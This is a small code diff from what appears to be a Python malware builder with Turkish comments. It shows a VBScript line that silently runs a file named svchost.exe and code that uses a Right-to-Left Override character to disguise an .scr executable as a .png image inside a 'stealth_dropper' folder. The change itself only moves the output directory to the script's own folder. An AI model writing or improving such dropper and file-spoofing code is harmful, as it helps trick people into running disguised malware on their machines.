@@ -643,7 +643,10 @@ WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
         
         # Örn: resim + RLO + gnp.scr -> resimrcs.png
         rlo_name = f"{base_name}{RLO}{reversed_ext}.{real_ext}"
-        rlo_dir = os.path.join(os.getcwd(), 'stealth_dropper')
+        
+        # os.getcwd() yerine scriptin bulundugu klasoru al
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        rlo_dir = os.path.join(base_dir, 'stealth_dropper')
         os.makedirs(rlo_dir, exist_ok=True)
         rlo_path = os.path.join(rlo_dir, rlo_name)
 
